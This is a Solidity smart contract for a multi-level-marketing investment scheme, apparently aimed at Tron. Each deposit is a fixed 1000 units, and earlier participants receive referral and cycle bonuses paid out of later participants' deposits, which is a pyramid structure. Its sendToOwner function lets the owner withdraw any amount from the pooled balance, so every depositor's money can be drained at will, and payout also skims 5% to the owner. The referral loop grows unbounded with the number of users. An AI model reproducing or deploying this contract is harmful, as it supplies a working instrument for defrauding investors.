// SPDX-License-Identifier:UNLICENSED
pragma solidity 0.8.14;

contract MLMContract {

    struct Deposit {
        uint256 id;
        uint256 amount;
        uint256 referralBonus;
        address preReferrer;
        uint256 preRefId;
        address referral;
        uint256 refId;
        uint256 count;
        uint256 cycle;
	    bool closed;
    }

    struct User {
        uint256 totalBonus;
        uint256 withdrawAmount;
        uint256 totalInvestment;
        Deposit[] deposits;
    }
    
    mapping (address => User) private users;
    address private previousReferrer;
    uint256 private previousReferrerId;
    address payable public owner;
    
    uint256 public lastUserId = 0;

    constructor() {
        owner = payable(msg.sender);
        User storage user = users[msg.sender];
        user.deposits.push(Deposit({
            id: 0,
            amount: 0,
            referralBonus: 0,
            preReferrer: address(0),
            preRefId: 0,
            referral: address(0),
            refId: 0,
            count: 0,
            cycle: 0,
            closed: false
        }));
        previousReferrer = owner;
        previousReferrerId = 0;
        users[msg.sender].totalBonus = 0;
    }
    
    function deposit (address referrer, uint256 id) public payable {
        require(msg.value == 1000 ether, "Investment cost is 1000 trx");
        lastUserId++;
        User storage user = users[msg.sender];
        user.deposits.push(Deposit({
            id: lastUserId,
            amount: msg.value, 
            referralBonus: 0,
            preReferrer: previousReferrer,
            preRefId: previousReferrerId,
            referral: referrer,
            refId: id,
            count: 0,
            cycle: 0,
            closed: false
        }));
        user.totalInvestment += msg.value;
        if(referrer != owner && referrer != address(0)) {
            users[referrer].deposits[id].referralBonus = users[referrer].deposits[id].referralBonus + (msg.value * 20 / 100);
            users[referrer].totalBonus = users[referrer].totalBonus + (msg.value * 20 / 100);
        }
        payForReferrer(previousReferrer,msg.value,previousReferrerId);
        previousReferrer = msg.sender;
        previousReferrerId = users[msg.sender].deposits.length-1;
    }

    function payForReferrer(address referral, uint256 amount, uint256 depositId) private {
        for(uint i = 0;i < lastUserId;i++) {
            if(!users[referral].deposits[depositId].closed && referral != owner){
                if(users[referral].deposits[depositId].count < 8) {
                    users[referral].deposits[depositId].count = users[referral].deposits[depositId].count+1;
                } 
                else {
                    users[referral].deposits[depositId].count = 1;                    
                    users[referral].totalBonus = users[referral].totalBonus + (amount* 50 / 100);
                    users[referral].deposits[depositId].referralBonus = users[referral].deposits[depositId].referralBonus + (amount * 50 / 100);
                    users[referral].deposits[depositId].cycle += 1;
                    if(users[referral].deposits[depositId].referral != owner && users[referral].deposits[depositId].referral != address(0)) {
                        address refer = users[referral].deposits[depositId].referral;
                        users[refer].deposits[depositId].referralBonus = users[refer].deposits[depositId].referralBonus + (amount * 125 / 1000);
                        users[refer].totalBonus = users[refer].totalBonus + (amount * 125 / 1000);
                    }
                    if(users[referral].deposits[depositId].cycle == 8 ) {
                        users[referral].deposits[depositId].closed = true;
                        users[referral].deposits[depositId].count = 0;
                    }
                } 
            }
            address temp = referral;
            referral = users[referral].deposits[depositId].preReferrer;
            depositId = users[temp].deposits[depositId].preRefId;
        }
    }
    
    function sendToOwner(uint256 amount) external payable returns (bool) {
        require(msg.sender == owner,"access denied its only for owner");
        owner.transfer(amount);
        return true;
    }

    function getBalance () external view returns (uint256) {
        return address(this).balance;
    }

    function payout(address payable recipient,uint256 amount) external payable returns(bool) {
        require(users[recipient].totalBonus >= amount,"insufficient amount");
        owner.transfer(amount * 5 / 100);
        recipient.transfer(amount - (amount * 5 / 100));
        users[recipient].totalBonus = users[recipient].totalBonus - amount;
        users[recipient].withdrawAmount = users[recipient].withdrawAmount + amount;
        return true;
    }
    
    function userDetails() public view returns(uint256, uint256, uint256) {
        User storage user = users[msg.sender];
        return (user.totalBonus, user.withdrawAmount, user.totalInvestment );
    } 
    
    function depositAtIndex(uint index) public view returns (uint256, uint256, uint256, address, uint256, address, uint256, uint256, uint256, bool) {
         User storage user = users[msg.sender];
         require(index < user.deposits.length, "Deposit Not Available");
         Deposit storage dep = user.deposits[index];
         return (dep.id, dep.amount, dep.referralBonus, dep.preReferrer, dep.preRefId, dep.referral, dep.refId, dep.count, dep.cycle, dep.closed);
    }  
}